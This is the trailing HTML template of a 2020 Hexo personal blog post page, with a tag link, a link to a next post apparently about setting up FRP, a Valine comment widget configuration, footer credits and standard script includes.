            </li>
          </ul>
        
      </div>
      
        <div class="post-tags">
          
            <a href="/tags/tp/" rel="tag"><i class="fa fa-tag"></i> tp</a>
          
        </div>
      

        
        
  <nav class="post-nav">
    
    
      <a class="next" href="/2020/03/13/FRP%E6%90%AD%E5%BB%BA/">
        <span class="next-text nav-default">FRPæ­å»º</span>
        <span class="prev-text nav-mobile">Next</span>
        <i class="iconfont icon-right"></i>
      </a>
    
  </nav>

        
  <div class="comments" id="comments">
    
      <div id="vcomments"></div>
    
  </div>


      </footer>
    
  </article>

    </div>

      </div>

      <footer id="colophon">
<span class="copyright-year">
    
        &copy;
    
    2020
    <span class="footer-author">glotozz.</span>
    <span class="power-by">
        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
    </span>
</span>

      </footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div>
    



  
<!-- valine Comments -->
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src="//cdn.jsdelivr.net/gh/xcss/valine@v1.1.7/dist/Valine.min.js"></script>
<script type="text/javascript">
    new Valine({
        el: '#vcomments',
        notify: false,
        verify: false,
        app_id: "d2XJ52o9D5xTnDd2J92VPPna-gzGzoHsz",
        app_key: "P6wHC0f6Fn02hW8SSdnax8wa",
        placeholder: "Just go go",
        avatar: 'mm'
    });
</script>


    




  
    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
  

  

    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>

  </body>
</html>
